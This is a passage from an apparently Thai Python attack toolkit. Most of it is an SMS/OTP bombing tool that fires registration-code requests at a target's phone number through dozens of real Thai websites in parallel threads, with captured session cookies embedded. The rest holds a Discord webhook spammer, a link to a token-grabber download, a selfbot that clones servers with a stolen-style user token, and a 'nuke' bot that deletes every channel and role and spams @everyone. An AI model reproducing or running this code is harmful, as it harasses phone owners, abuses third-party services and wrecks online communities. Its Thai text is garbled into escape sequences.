        head = {            "content-type": "application/json;charset=UTF-8",            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",            "accept": "application/json, text/plain, */*",            "referer": "https://vaccine.trueid.net/",            "cookie": "tids=cj6rr5kfn7n5eq48kjvtjshbmm6fl822;visid_incap_2104120=tLQf04X9QQOCL3N5NvNoVFt6lGEAAAAAQUIPAAAAAACBOqMUEW78XaYnxR7kJ7pF;_ga_id=908257605.1637120616;_gcl_au=1.1.781159093.1639210714;_fbp=fb.1.1639210716826.1287073338;visid_incap_2608850=sCqytT60R3yHmHPZaoQgs9WLuGEAAAAAQUIPAAAAAADemRF44I7x0AvVgLWDt3rL;pbjs-pubCommonId=4764c6cc-f296-45a4-873a-5cd0bd43510e;_cc_id=c18b09fbdfdf3183761afb6f7799f21d;unique_user_id=332651712.1639210715;__gads=ID=abe63e684890d998:T=1639484401:S=ALNI_MbXUWyQkNhtJ2m57vxHz6ORO4bxRg;_ga=GA1.2.332651712.1639210715;_gid=GA1.2.465629380.1639888137;_gat_UA-86733131-1=1;_cbclose=1;_cbclose26068=1;_uid26068=B513FC64.8;_ctout26068=1;verify=test;OptanonConsent=isIABGlobal=false&datestamp=Sun+Dec+19+2021+11%3A29%3A09+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.13.0&hosts=&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1%2CC0005%3A1&geolocation=%3B&AwaitingReconsent=false;OptanonAlertBoxClosed=2021-12-19T04:29:09.733Z;_ga_R05PJC3ZG8=GS1.1.1639888134.6.1.1639888160.34"            }        
        response = requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",headers=head,json={"msisdn":phone,"function":"enroll"})       
        print(f'[+]ATTACK TO {phone}')       
    def api44():        
        head = {            "x-requested-with": "XMLHttpRequest",            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",            "accept": "*/*",            "referer": "https://ufa108.ufabetcash.com/register.php",            "cookie": "PHPSESSID=94e150551f39f0b2fcf142b58c21bb77"            }        
        response = requests.post("https://ufa108.ufabetcash.com/api/",headers=head,data=f"cmd=request_form_register_detail_check&web_account_id=36&auto_bank_group_id=1&m_name=sl&m_surname=ak&m_line=snsb1j&m_bank=4&m_account_number=8572178402&m_from=41&m_phone={phone}")       
        print(f'[+]ATTACK TO {phone}')                       
    def api46():        
        response = requests.post("https://www.qqmoney.ltd/jackey/sms/login",json = {"appId":"5fc9ff297eb51f1196350635","companyId":"5fc9ff12197278da22aff029","mobile": phone},headers={"Content-Type": "application/json;charset=UTF-8"})      
        print(f'[+]ATTACK TO {phone}')       
    def api48():        
        response = requests.post("https://m.pgwin168.com/api/register-otp",json ={"brands_id":"60e4016f35119800184f34a5","agent_register":"60e57c3b2ead950012fc5fba","tel": phone})       
        print(f'[+]ATTACK TO {phone}')       
    def api49():        
        response = requests.post("https://www.som777.com/api/otp/register",json ={"applicant": phone,"serviceName":"SOM777"})       
        print(f'[+]ATTACK TO {phone}')       
    def api50():        
        response = requests.post("https://www.konglor888.com/api/otp/register",json = {"applicant": phone,"serviceName":"KONGLOR888"})       
        print(f'[+]ATTACK TO {phone}')       
    def api51():        
        response = requests.get("https://api.quickcash8.com/v1/login/captcha?timestamp=1636359633&sign=3a11b88fbf58615099d15639e714afcc&token=&version=2.3.2&appsFlyerId=1636346593405-2457389151564256014&platform=android&channel_str=&phone="+phone+"&img_code=", headers = {"Host": "api.quickcash8.com", "Connection": "Keep-Alive", "Accept": "gzip", "User-Agent": "okhttp/3.11.0"})       
        print(f'[+]ATTACK TO {phone}')       
    def api52():        
        response = requests.get("https://users.cars24.co.th/oauth/consumer-app/otp/"+phone+"?lang=th", headers = {"accept": "application/json, text/plain, */*","x_vehicle_type":"CAR","cookie":"_ga=GA1.3.523508414.1640152799;_gid=GA1.3.999851247.1640152799;_fbp=fb.2.1640152801502.837786780;_gac_UA-65843992-28=1.1640152807.EAIaIQobChMIi9jVo9329AIVizArCh1bFAuMEAAYASAAEgJqA_D_BwE;_dc_gtm_UA-65843992-28=1;_hjSessionUser_2738441=eyJpZCI6IjYwMjMzZjYyLTFlMzYtNWZmMy04MjZkLTMzOTAxNTMwODQ4NyIsImNyZWF0ZWQiOjE2NDAxNTI4MDEzMDYsImV4aXN0aW5nIjp0cnVlfQ==;_hjSession_2738441=eyJpZCI6ImI4MDNlNTFkLTFiYTYtNGExZi05MGIzLTk5OWRmMjhhM2RiOCIsImNyZWF0ZWQiOjE2NDAxNjY4ODgwNDF9;_hjAbsoluteSessionInProgress=0;cto_bundle=uVFzcF8lMkYxM0hsRGxQc1M4YThaRmhHJTJGRTBtSUdwNzVuRkVldzI5QlpIYktWbnZFcUlzdDZ1ZnhMT3JqVVhFQyUyQmtGUE9MTFk5akpyVnl4ekZnZlJ4UVN3WnRHdUNyJTJGWW03aVRSeWtLc2wxTjA3QmR0THNzcjNsJTJCcEJHSXlOUzNxTVc2ZmJPaGclMkZhRUhkV3I2cTI1dXUlMkZhYnl1dyUzRCUzRA"})       
        print(f'[+]ATTACK TO {phone}')       
    def api53():        
        response = requests.post("https://www.kaitorasap.co.th/login/", data = {"phone_number": phone,"lag": " "})       
        print(f'[+]ATTACK TO {phone}')       
    def api54():        
        requests=Session()        
        token=search('<meta name="_csrf" content="(.*)" />',requests.get("https://www.shopat24.com/register/").text).group(1)        
        response = requests.post("https://www.shopat24.com/register/ajax/requestotp/",data=f"phoneNumber={phone}",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","x-csrf-token": token})       
        print(f'[+]ATTACK TO {phone}')       
    def api57():        
        response = requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone})       
        print(f'[+]ATTACK TO {phone}')       
    def api58():        
        head = {            "x-requested-with": "XMLHttpRequest",            "accept": "text/html, */*; q=0.01",            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",            "referer": "https://www.tgfone.com/signin/register"            }        
        response = requests.post("https://www.tgfone.com/signin/otp_chk_fast",headers=head,json=f"mobile={phone}&type_otp=7")       
        print(f'[+]ATTACK TO {phone}')       
    def api59():        
        head = {            "x-requested-with": "XMLHttpRequest",            "accept": "application/json, text/javascript, */*; q=0.01",            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",            "referer": "https://ufa3bb.com/account/register",            "cookie": "_ga=GA1.2.1794924533.1639040857;ci_session=alj35so836p0d39gckneiqsuql03193n"            }        
        response = requests.post("https://ufa3bb.com/account/register/sendotp",headers=head,data=f"phone={phone}")       
        print(f'[+]ATTACK TO {phone}')       
    def api60():        
        response = requests.post("https://login.s-momclub.com/accounts.otp.sendCode", data=f"phoneNumber=%2B66{phone[1:]}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Flogin&sdkBuild=12563&format=json",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "gmid=gmid.ver4.AcbHriHAww._ill8qHpGNXtv9aY3XQyCvPohNww4j7EtjeiM3jBccqD7Vx0OmGeJuXcpQ2orXGs.nH0yRZjbm75C-5MVgB2Ii0PWvx6TICBn1LYI_XtlgoHg9mnouZgNs6CHULJEitOfkBhHvf8zUvrvMauanc52Sw.sc3;ucid=Tn63eeu2u8ygoINkqYBk5w;hasGmid=ver4;_ga=GA1.2.1714152564.1642328595;_fbp=fb.1.1642328611770.178002163;_gcl_au=1.1.64457176.1642329285;gig_bootstrap_3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC=login_ver4;_gid=GA1.2.1524201365.1642442639;_gat=1;_gat_rolloutTracker=1;_gat_globalTracker=1;_gat_UA-62402337-1=1"})       
        print(f'[+]ATTACK TO {phone}')      
    def api61():        
        response = requests.post("https://globalapi.pointspot.co/papi/oauth2/signinWithPhone", data={"phoneNumber": f"+66{phone[1:]}"})       
        print(f'[+]ATTACK TO {phone}')      
    def api62():        
        response = requests.get(f"https://hdmall.co.th/phone_verifications?express_sign_in=1&mobile={phone}")       
        print(f'[+]ATTACK TO {phone}')      
    def api64():        
        response = requests.post("https://account.xiaomi.com/pass/sendPhoneRegTicket", data=f"region=US&phone=%2B66{phone[1:]}",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "captchaToken=mXYXs+xvEHAZdhKnXK1XlopRcisSn05D6xhZU+uL3ghvh1Yf/4rYTExH+2xl+yZv;deviceId=wb_aca09552-fd37-4204-9d7a-20045de5c5bf;uLocale=en"})       
        print(f'[+]ATTACK TO {phone}')      
    def api65():        
        response = requests.post("https://gamingnation.dtac.co.th/api/otp/request", data={"template":"register","phone_no":phone},headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})       
        print(f'[+]ATTACK TO {phone}')               ##########################call#################################            
    #CALL BKGAME.BET    
    def call1():        
        head = {            "Host": "bkgame.bet",            "content-length": "23",            "sec-ch-ua-mobile": "?1",            "x-requested-with": "XMLHttpRequest",            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",            "content-type": "application/x-www-form-urlencoded",            "accept": "application/json, text/javascript, */*; q=0.01",            "sec-ch-ua-platform": "Android",            "origin": "https://bkgame.bet",            "sec-fetch-site": "same-origin",            "sec-fetch-mode": "cors",            "sec-fetch-dest": "empty",            "referer": "https://bkgame.bet/",            "cookie": "_ga=GA1.2.1537890943.1642644396;PHPSESSID=vlhg6htsbo54m6hehlklpgtb53;_gid=GA1.2.650762125.1645633000"            }        
        response=requests.post("https://bkgame.bet/env/authen.php?requestotp",headers=head,data=f"phone_number={phone}")       
        print(f'[+]ATTACK TO {phone}')      
    for i in range(count):        
        time.sleep(.1)        
    threading.Thread(target=sk1).start()        
    threading.Thread(target=sk3).start()        
    threading.Thread(target=sk5).start()        
    threading.Thread(target=sk7).start()       
    threading.Thread(target=sk9).start()        
    threading.Thread(target=sk10).start()        
    threading.Thread(target=sk11).start()        
    threading.Thread(target=sk13).start()        
    threading.Thread(target=sk15).start()        
    threading.Thread(target=sk16).start()        
    threading.Thread(target=sk17).start()        
    threading.Thread(target=sk21).start()        
    threading.Thread(target=sk23).start()        
    threading.Thread(target=sk24).start()        
    threading.Thread(target=sk25).start()        
    threading.Thread(target=sk26).start()        
    threading.Thread(target=sk27).start()        
    threading.Thread(target=sk28).start()        
    threading.Thread(target=sk29).start()        
    threading.Thread(target=sk30).start()        
    threading.Thread(target=sk31).start()        
    threading.Thread(target=sk32).start()        
    threading.Thread(target=x1).start()        
    threading.Thread(target=x2).start()        
    threading.Thread(target=x4).start()        
    threading.Thread(target=x8).start()        
    threading.Thread(target=x9).start()        
    threading.Thread(target=x10).start()        
    threading.Thread(target=api1).start()        
    threading.Thread(target=api2).start()        
    threading.Thread(target=api4).start()        
    threading.Thread(target=api5).start()        
    threading.Thread(target=api6).start()        
    threading.Thread(target=api7).start()        
    threading.Thread(target=api8).start()        
    threading.Thread(target=api9).start()        
    threading.Thread(target=api10).start()        
    threading.Thread(target=api11).start()        
    threading.Thread(target=api12).start()        
    threading.Thread(target=api13).start()        
    threading.Thread(target=api14).start()        
    threading.Thread(target=api15).start()        
    threading.Thread(target=api16).start()        
    threading.Thread(target=api18).start()        
    threading.Thread(target=api19).start()        
    threading.Thread(target=api22).start()        
    threading.Thread(target=api21).start()        
    threading.Thread(target=api23).start()        
    threading.Thread(target=api24).start()        
    threading.Thread(target=api25).start()        
    threading.Thread(target=api26).start()        
    threading.Thread(target=api27).start()        
    threading.Thread(target=api28).start()        
    threading.Thread(target=api29).start()        
    threading.Thread(target=api30).start()        
    threading.Thread(target=api31).start()        
    threading.Thread(target=api32).start()        
    threading.Thread(target=api33).start()        
    threading.Thread(target=api34).start()        
    threading.Thread(target=api35).start()        
    threading.Thread(target=api36).start()        
    threading.Thread(target=api37).start()        
    threading.Thread(target=api38).start()        
    threading.Thread(target=api39).start()        
    threading.Thread(target=api40).start()        
    threading.Thread(target=api41).start()        
    threading.Thread(target=api42).start()        
    threading.Thread(target=api43).start()        
    threading.Thread(target=api44).start()        
    threading.Thread(target=api46).start()        
    threading.Thread(target=api48).start()        
    threading.Thread(target=api49).start()        
    threading.Thread(target=api50).start()        
    threading.Thread(target=api51).start()        
    threading.Thread(target=api52).start()        
    threading.Thread(target=api53).start()        
    threading.Thread(target=api54).start()        
    threading.Thread(target=api57).start()        
    threading.Thread(target=api58).start()        
    threading.Thread(target=api59).start()        
    threading.Thread(target=api60).start()        
    threading.Thread(target=api61).start()        
    threading.Thread(target=api62).start()        
    threading.Thread(target=api64).start()        
    threading.Thread(target=api65).start()                
    threading.Thread(target=call1).start()        
    print('ATTACK SUCCSS!! - | ', i)#######################################################################################################################################
def webhooktool():    
    from httpx import post    
    import requests     
    print(Fore.GREEN + """""")    
    mode = input("xe0xb8x81xe0xb8xa3xe0xb8xb8xe0xb8x93xe0xb8xb2xe0xb9x80xe0xb8xa5xe0xb8xb7xe0xb8xadxe0xb8x81xe0xb9x82xe0xb8xabxe0xb8xa1xe0xb8x94 : ")        
    if mode == "1":        
        os.system('cls' if os.name == 'nt' else 'clear')        
        webhook = input("xe0xb8xa5xe0xb8xb4xe0xb9x89xe0xb8x87xe0xb9x80xe0xb8xa7xe0xb9x87xe0xb8x9axe0xb8xaexe0xb8xb8xe0xb8x84 : ")        
        con = input("xe0xb8x82xe0xb9x89xe0xb8xadxe0xb8x84xe0xb8xa7xe0xb8xb2xe0xb8xa1xe0xb8x97xe0xb8xb5xe0xb9x88xe0xb8x88xe0xb8xb0xe0xb8xaaxe0xb9x81xe0xb8x9bxe0xb8xa1 : ")        
        while True:            
                post(webhook,json={"content": "@everyone","embeds": [{"title": f"CNP MOBILE","description":f"```pyn{con}n```","color": 2752256}]})            
        print("xe0xb8xaaxe0xb8xb3xe0xb9x80xe0xb8xa3xe0xb9x87xe0xb8x88!")    
    if mode == "2":        
        os.system('cls' if os.name == 'nt' else 'clear')     
        def delete(urlwebhook):            
            requests.delete(            url=urlwebhook,            )        
        urll = input("xe0xb8xa5xe0xb8xb4xe0xb9x89xe0xb8x87xe0xb9x80xe0xb8xa7xe0xb9x87xe0xb8x9axe0xb8xaexe0xb8xb8xe0xb8x84 : ")        
        delete(urll)        
        print("xe0xb8xa5xe0xb8x9axe0xb9x80xe0xb8xa3xe0xb8xb5xe0xb8xa2xe0xb8x9axe0xb8xa3xe0xb9x89xe0xb8xadxe0xb8xa2")    
def gettoken():    
        print(Fore.CYAN + """     xe2x95x94xe2x95x90xe2x95x97xe2x95x94xe2x95x97xe2x95x94xe2x95x94xe2x95x90xe2x95x97  xe2x95x94xe2x95x90xe2x95x97xe2x95x94xe2x95x90xe2x95x97xe2x95x94xe2x95xa6xe2x95x97xe2x95x94xe2x95xa6xe2x95x97xe2x95xa6 xe2x95xa6xe2x95x94xe2x95x97xe2x95x94xe2x95xa6xe2x95x94xe2x95xa6xe2x95x97xe2x95xa6 xe2x95xa6     xe2x95x91  xe2x95x91xe2x95x91xe2x95x91xe2x95xa0xe2x95x90xe2x95x9d  xe2x95x91  xe2x95x91 xe2x95x91xe2x95x91xe2x95x91xe2x95x91xe2x95x91xe2x95x91xe2x95x91xe2x95x91 xe2x95x91xe2x95x91xe2x95x91xe2x95x91xe2x95x91 xe2x95x91 xe2x95x9axe2x95xa6xe2x95x9d     xe2x95x9axe2x95x90xe2x95x9dxe2x95x9dxe2x95x9axe2x95x9dxe2x95xa9    xe2x95x9axe2x95x90xe2x95x9dxe2x95x9axe2x95x90xe2x95x9dxe2x95xa9 xe2x95xa9xe2x95xa9 xe2x95xa9xe2x95x9axe2x95x90xe2x95x9dxe2x95x9dxe2x95x9axe2x95x9dxe2x95xa9 xe2x95xa9  xe2x95xa9     """)    
        print("Download : https://www.mediafire.com/file/fwpx3071zjbm1at/GetToken%2528mobile%2529.zip/file")    
        input()
def copydiscord():    
    import requests    
    from websocket import WebSocket    
    from concurrent.futures import ThreadPoolExecutor    
    from json import loads, dumps, load    
    import random, discord, threading, os, datetime, asyncio    
    from time import sleep    
    from colorama import Fore, init    
    from discord.ext import (        
        commands,    
    )    
    init()   
    prefix = '!'    
    intents = discord.Intents.default()    
    intents.presences = True    
    intents.members = True    
    bot = discord.Client.__init__('intents')    
    bot = commands.Bot(description='Selfbot',command_prefix=prefix,self_bot=True)        
    bot.remove_command('help')    
    def asciigen(length):        
        asc = ''        
        for x in range(int(length)):            
            num = random.randrange(13000)            
            asc = asc + chr(num)        
            return asc    
    def newpage():        
        os.system('cls' if os.name == 'nt' else 'clear')        
        print(Fore.CYAN + """        xe2x95x94xe2x95x90xe2x95x97xe2x95x94xe2x95x97xe2x95x94xe2x95x94xe2x95x90xe2x95x97  xe2x95x94xe2x95x90xe2x95x97xe2x95x94xe2x95x90xe2x95x97xe2x95x94xe2x95xa6xe2x95x97xe2x95x94xe2x95xa6xe2x95x97xe2x95xa6 xe2x95xa6xe2x95x94xe2x95x97xe2x95x94xe2x95xa6xe2x95x94xe2x95xa6xe2x95x97xe2x95xa6 xe2x95xa6        xe2x95x91  xe2x95x91xe2x95x91xe2x95x91xe2x95xa0xe2x95x90xe2x95x9d  xe2x95x91  xe2x95x91 xe2x95x91xe2x95x91xe2x95x91xe2x95x91xe2x95x91xe2x95x91xe2x95x91xe2x95x91 xe2x95x91xe2x95x91xe2x95x91xe2x95x91xe2x95x91 xe2x95x91 xe2x95x9axe2x95xa6xe2x95x9d        xe2x95x9axe2x95x90xe2x95x9dxe2x95x9dxe2x95x9axe2x95x9dxe2x95xa9    xe2x95x9axe2x95x90xe2x95x9dxe2x95x9axe2x95x90xe2x95x9dxe2x95xa9 xe2x95xa9xe2x95xa9 xe2x95xa9xe2x95x9axe2x95x90xe2x95x9dxe2x95x9dxe2x95x9axe2x95x9dxe2x95xa9 xe2x95xa9  xe2x95xa9         """)        
        print(f"{Fore.RESET}{Fore.LIGHTBLUE_EX}xe0xb9x82xe0xb8x9bxe0xb8xa3xe0xb8x94xe0xb8x9exe0xb8xb4xe0xb8xa1xe0xb8x9exe0xb9x8c {prefix}copy xe0xb9x83xe0xb8x99xe0xb8x94xe0xb8xb4xe0xb8xaaxe0xb8x84xe0xb8xadxe0xb8x95xe0xb8x97xe0xb8xb5xe0xb9x88xe0xb8x95xe0xb9x89xe0xb8xadxe0xb8x87xe0xb8x81xe0xb8xb2xe0xb8xa3xe0xb8x81xe0xb9x87xe0xb8xadxe0xb8x9b!")    
    def start():        
        token = input("Enter Token : ")        
        bot.run(token, bot=False, reconnect=True)    
    @bot.event    
    async def on_command_error(ctx, error):        
        error_str = str(error)        
        error = getattr(error, 'original', error)        
        if isinstance(error, commands.CommandNotFound):            
            pass        
        elif isinstance(error, commands.CheckFailure):            
            pass        
        elif isinstance(error, commands.MissingRequiredArgument):            
            pass        
        elif isinstance(error, discord.errors.Forbidden):            
            pass        
        elif "Cannot send an empty message" in error_str:            
            pass        
        else:            
            pass    
    @bot.event    
    async def on_connect():        
        print(f"login as {bot.user}")        # 
        newpage()    
    @bot.command()    
    async def copy(ctx):        
        await ctx.message.delete()        
        name = f'CNP-{ctx.guild.name}'        
        await bot.create_guild(name)        
        await asyncio.sleep(4)        
        for g in bot.guilds:            
            if name in g.name:                
                for c in g.channels:                    
                    await c.delete()                
                for cate in ctx.guild.categories:                    
                    x = await g.create_category(f"{cate.name}")                    
                for chann in cate.channels:                        
                    if isinstance(chann, discord.VoiceChannel):                            
                        await x.create_voice_channel(f"{chann}")                        
                    if isinstance(chann, discord.TextChannel):                            
                        await x.create_text_channel(f"{chann}")                    # 
                    for role in ctx.guild.roles:                    #     
                        print(role)                    #     
                        await g.create_role(name=f"{role}")        
                        try:                            
                            await g.edit(icon=ctx.guild.icon_url)       
                        except:pass    
    start()
randcolor = random.randint(0x000000, 0xFFFFFF)
def newn():    
    import os    
    import discord    
    from httpx import post    
    import requests    
    from discord.ext import commands    
    from time import sleep    
    import threading    
    activity = discord.Activity(type=discord.ActivityType.playing,name=f"xf0x9fx92x9c : xe0xb8x9exe0xb8xa3xe0xb9x89xe0xb8xadxe0xb8xa1 nuke!")    
    client = commands.Bot(command_prefix="!", activity=activity)    
    TOKEN = input('Token : ')    
    channelcreatename = input('Channel Name to create : ')    
    kumtospam = input('Message to Spam : ')    
    titlenuke = input('Server Name : ')    
    @client.event    
    async def on_ready():        
        os.system('cls' if os.name == 'nt' else 'clear')        
        print(f"Login as : {client.user}")        
        print(f"Load command. . .")        
        sleep(2)        
        os.system('cls' if os.name == 'nt' else 'clear')        
        print(f"""             Login as : {client.user}             [ prefix : ! , commands ]        xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90            !nuke                - nuke discord            !delete              - delete all channels            !role                - delete all roles            !ch [name] [count]   - create channel            !spam [msg]          - spam @everyone            !stop                - logout         """)    
    @client.command()    
    async def stop(ctx):        
        await ctx.message.delete()        
        client.logout()        
        print(f"{client.user} has offline")    
    @client.command()    
    async def delete(ctx):        
        await ctx.message.delete()        
        guild = ctx.guild        
        for channel in guild.channels:            
            try:                
                await channel.delete()                
                print(f'Deleted Channels : {channel.name}')            
            except:                
                    print(f'Fail Deleted Channels : {channel}')    
    @client.command()    
    async def role(ctx):        
        await ctx.message.delete()        
        guild = ctx.guild        
        for role in guild.roles:            
            try:                
                await role.delete()                
                print(f'Deleted Roles : {role.name}')            
            except:                
                    print(f'Fail Deleted Roles : {role.name} ')    
    @client.command()    
    async def ch(ctx, channelcreatenamegg, abount):        
        await ctx.message.delete()        
        guild = ctx.guild        
        try:            
            for i in range(int(abount)):                
                await guild.create_text_channel(channelcreatenamegg)                
                print(f'Create Channels : {channelcreatenamegg}')        
        except:            
            print(('fail to create'))                
    @client.command()    
    async def spam(ctx, msg):        
        await ctx.message.delete()       
        guild = ctx.guild        
        for channel in guild.channels:            
            while True:                
                try:                    
                    await channel.send(f'@everyone {msg}')                    
                    print(f'Spam Send!')                
                except:                    
                        print(('fail'))            
    @client.command()    
    async def nuke(ctx):        
        await ctx.message.delete()        
        guild = ctx.guild        
        await ctx.guild.edit(name=titlenuke,description="CNP FLOOD",                        reason="CNP ON TOP",                        )        
        for role in guild.roles:            
            try:                
                await role.delete()                
                print(f'Deleted Roles : {role.name}')            
            except:                
                    print(f'Fail Deleted Roles : {role.name} ')        
            for channel in guild.channels:            
                try:                
                    await channel.delete()                
                    print(f'Deleted Channels : {channel.name}')            
                except:                
                    print(f'Fail Deleted Channels : {channel}')        
        try:            
            for i in range(9999):                
                await guild.create_text_channel(channelcreatename)                
                print(f'Create Channels : {channelcreatename}')        
        except:            
            print(('fail to create'))        
        #Embed Spam 
    messpamnuke1 = """"    xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93    xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93    xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93    xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93    xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93    xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93    xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93    xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93    xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93    xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93    xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93    